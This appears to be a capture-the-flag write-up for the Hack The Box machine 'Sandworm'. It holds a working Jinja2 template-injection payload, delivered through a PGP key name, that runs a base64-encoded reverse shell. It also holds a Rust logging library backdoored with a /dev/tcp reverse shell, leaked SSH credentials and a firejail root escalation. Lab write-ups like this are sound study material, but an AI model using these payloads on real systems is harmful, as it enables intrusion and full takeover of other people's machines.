![Pasted image 20230622093204](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/35608c94-8a6a-4d26-9a45-4128b1501a1d)

# Enumeration

Nmap:

![Pasted image 20230622093756](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/6e492f4e-cdf5-4e11-9605-48e199514f4b)

>- 22 - SSH. Not likely
>- 80 - Website
>- 443 - website

I'll start exploring the websites...
![Pasted image 20230622093908](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/b9025976-b802-471f-85db-22714570ac2a)

Need to add the site to hosts.
![Pasted image 20230622094016](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/c162e86c-a1a8-4c4c-95c4-9731bd4c34c7)

It does have a self signed ssl certificate by the looks of it. Might be worth checking out. 

![Pasted image 20230622094208](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e3c39e34-64a3-4052-8c58-3e2a01d37d8d)

powered by flask and has a few other systems running the site. 

Looking at the contact page:
![Pasted image 20230622094328](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5a46f16d-0b8e-49ac-9693-68f473cd9b4b)

I see there is a form where I can enter text. It uses "PGP-encryption" which I'm not entirely sure what that means, but it may be a vector for entry. 
Following the guide has a few examples of ways to encrypt a message. Might be something I can do?

Found an admin login page:
![Pasted image 20230622094854](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/6a042721-dd65-4cf4-b23d-dd8a7b1a6659)


Dirb was also able to find a lot of pages:
![Pasted image 20230622094955](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/83acbe34-b073-4793-b77f-0b4a4fbd0f36)


Looking at the forum posts so far, it looks like the PGP is the way in. I think I may have all I need for now...

# Foothold

Now to get in. I need to use this PGP encryption to send information to the machine and get a shell.... Really not sure how to do that. Guess I'll start researching what the heck PGP is.

After some digging, it is a way to encrypt messages, but it has some drawbacks. It's not very user friendly and it requires the sender and recipient to be using the exact same version of the encryption or it will fail. Based on that, I'll definitely need to be using the tools provided in the website's guide section. 

> Quite a few people in the HTB forum are saying that using an `-a` in the command for PGP will give an ascii format instead of binary. 

There was an article someone posted regarding SSTI (Server Side Template Injection)
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

Never heard of that, but I can imagine that it involves injecting code into a template


Reading into the website more, I can test for the vulnerability in the forms by submitting something inside curly braces. In this case, sending `{{7*7}}` should have the system send back `49` as a result. This means it blindly takes in commands in this way and will just run them. 

The SSA site has a handful of places I can enter information. 
on the /guide page, but it only gives back my own information if I use the "Decrypt" function. If I try using the site to encrypt a message, it generates it's own encrypted text telling me "yay it worked" when I decrypt it. I may need to encrypt separately and try that way... 
> GlobalDbag on the HTB forum said "Start with a good verification (Good Public key + good signature), find where you can input extradata without disrupting the verfication from taking place."
This also seems like solid advice. Putting these together, I think I need to add my injection somewhere in the mix... 

After more research I found a way to create my own signed message!
it uses a program called `gpg`

I can generate a key with the following steps:
```bash
gpg --gen-key
```
Following the steps will create a public key for me. 
Then I need to export the public key:
```bash
gpg -a -o public.key --export Thistle
```

![Pasted image 20230623120104](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4604e26d-3ad0-44ec-a9f0-9dd19d1a9328)

Now I can make a verified signature:
```bash
echo 'THIS IS A TEST' | gpg --clear-sign
```

![Pasted image 20230623120338](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/2e585204-0c45-4e9b-8a2c-c48c54128b20)


Now I can put this in the verify signature section and get a result:

![Pasted image 20230623120425](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5cebefb6-7671-47fb-9251-7f7f3800b5bd)

I can see where I put in "thistle" here. 
Comparing it to the original output in the website's example:

![Pasted image 20230623152407](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/6c809ae1-e8cb-4339-b657-41eea2f75eed)

I can see that I can set my own UID (thistle) which might be a way to inject code. I'll try to set a new one with the uid of `{{7*7}}` and see if the program runs it. 

![Pasted image 20230623153850](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5045d50e-6c38-45a8-8d87-0f96cfd3877f)


If it works, it will show my UID as "49"
... it doesn't work. Might need to have a normal uid and then change it after the fact?



After much effort and experimenting, I was able to get a change!
We need to alter the uid for the original signature. 
```bash
gpg --edit-key test@test.com
```
> The email must be the same as the key you made to test!

```bash
gpg> adduid
```
this will prompt to add a second uid name to the chain. We're going to use `{{7*7}}` to see if my name changes. 

![Pasted image 20230623223201](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/d8114caf-fef5-4caa-9a76-3152b0fd8144)

Notice at the bottom, the two names that were made
Now use the `trust` command. 

![Pasted image 20230623223546](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/989bb407-e195-4f61-8cd8-4c45575b9a1a)


We now need to select the original. It will have the * symbol next to it. 

![Pasted image 20230623223417](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e8f5299d-0551-4e57-bb3e-537c20e5d488)

Now we need to delete the original name:

![Pasted image 20230623223623](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/21f896f2-2560-46d0-81ad-b5bf44d23dc1)

Use the `save` command to save

Now create the signed message and export the public key again. This time, it will use the new name:
```bash
gpg -a -o test.key --export {{7*7}}
```

Testing this message on the site gets:

![Pasted image 20230623223804](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/2aa4a61a-ffbb-4406-83c1-bb3d09b5f9f7)

It did the math! This is our point of entry!

I need to change the code to run something on the other box. I'm thinking netcat. [I found a github page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) detailing techniques:

![Pasted image 20230623225010](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/fb0ed23e-e954-4909-b7ef-77a8c169bd6b)


I'll also need to encode my shell. after base64 encoding, I created a command that looks like this:

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzkwMDEgMD4mMQ==" | base64 -d | bash').read() }}
```

Here are the signatures if the box's IP is still 10.10.14.149:

Pubkey:
```
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
8U6YtRBU1WmrGRpLkIFM
=4lfF
-----END PGP PUBLIC KEY BLOCK-----
```
And the signed message:
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

this is a test
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEE6OvRRSJ6hNzJXdfTdf+aE1tCMS0FAmSWVAwACgkQdf+aE1tC
MS1f3wv/QnBmtv3d+IZCVDnSfDBM1GZJ4/QcRhgq5IAHTekKzV1Z3z9WnUyZP7wv
Ud0BP7iALYOMdtlc3gERBAJvxUel5E/hNEXxd+0PaBMVN8DFLQhstMHjJuGxQxTD
f5xXu11UMA0NpFfQwdu7FhuEOVpxWvYlV/YQDIjScjIqV7PtYNlA0XeK4zo3Gf5t
+gOBMBQWHv+7OMe9XiTNJjhApBQ8C8fqMSdTHOw/fT2Dds6iYNRbjaOB8558AsPh
myM0n8YZQ/147DAULv4ZRrwGw9mnhVl0Za0QdS50bOfjBKFR86yCkQ5y5ay1eiAi
vcy6oTr9b+buHA14u5DGp9YU/Kan7tPb3gB8GUcZwImf7NmP/KUj2hVU5h1cC1Gp
vjbpTMNSferhdmBlw6svMku17NhYAM49KxGvTdaGDPGrGk4ZGG7WkxMUF00kXbu/
wm7IhTrQC5CfIpsl2vAunpYBMM0O9KKk5HdemSCXdU6Y7bKmklWxg4S/j0FLoUUD
srPWki16
=IBP8
-----END PGP SIGNATURE-----
```
And send it!

![Pasted image 20230623230126](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/f0e69434-25a3-4162-8050-e4097fa66f6f)

WOO!
Time for the user flag!

> ... there is no flag ...
 
I'm missing something... restricted user?

There are some hidden files in the home directory. I'll look there...

![Pasted image 20230623230540](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/a1e26a03-7124-451b-8fbd-2c997d942bf0)

... not a fan of that...

![Pasted image 20230623230630](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/223584c1-2f83-4570-bf33-166c6f557a95)

This looks interesting... 

![Pasted image 20230623230852](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5e5de3cf-f4ec-414f-abc9-d59f4691e833)

Tasty.

![Pasted image 20230623230919](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/344ff407-c85a-4795-8c19-2bb093b2bcfe)

Now I know the password to creepy dude.

![Pasted image 20230623231121](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/6796283f-cda4-489c-b80b-29004789930b)

Woo! That's SSH credentials! I don't need to fuck with that damn website anymore!!!

I also grabbed the user flag (for real this time 😄)

# Escalation

```
silentobserver
quietLiketheWind22
```
I think I found something interesting in /opt/ but I don't know what it's for...

It runs a program in the computer but I'm not sure how useful it is. Let's look around at other methods. 
Not in the sudo group...

Checking for SUID binaries:

![Pasted image 20230623231121](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/9d26b854-b59f-4b3d-9b6d-7b4d622ccd56)

firejail is interesting... 

Okay. Figured out what is going on. It's complicated...

First interesting thing is at /opt/crates/logger/src. There is a file called `lib.rs`
If it is not there, you need to run tipnet in the directory /opt/tipnet/target/debug/

Select option e to recreate the lib.rs file. 

From here we can view said file:
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}

```
Basically, there is a cron job that is running this script to write information to a log file. After running Tipnet with the e command, we are able to write our own code. I've changed the code to be the following:
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.79/4444 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("not work");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        println!("standar output: {}", stdout);
        println!("error output: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: {}", stderr);
    }

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```
Then I need to execute the following command before the cron job cleans the file away:
```bash
cargo build
```
This will write the code to the log files and the cron job should run it every few seconds. Now I just need to start a listener and I get a shell back for Atlas that isn't jailed!!

The interesting thing is that the atlas user has permission to run firejail. Now we need an exploit:
https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

This script will create a process in firejail that we can use to exploit the box. However, running the script will lock up the session and I need to run the join command in another atlas session. You can share the attack machines public rsa key to the box, or just edit the shell code from earlier to use a different port (if you are lazy like me). 

On one of the atlas shells, import the python script, change permissions to allow it to execute, then run it:
```bash
atlas@sandworm:~$ python3 exploit.py 
You can now run 'firejail --join=5095' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

Now in the other shell, I need to run the join command. This will spawn a new atlas shell. Then run 'su -' to switch to the root user:
```bash
atlas@sandworm:/opt/tipnet$ firejail --join=5095
firejail --join=5095
Warning: cleaning all supplementary groups
changing root to /proc/5095/root
Child process initialized in 11.95 ms
whoami
atlas
sudo su -
atlas is not in the sudoers file.  This incident will be reported.
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
su -
id
uid=0(root) gid=0(root) groups=0(root)
cd /root/
ls
Cleanup
domain.crt
domain.csr
domain.key
root.txt
```
Sandworm has been PWNED!!!
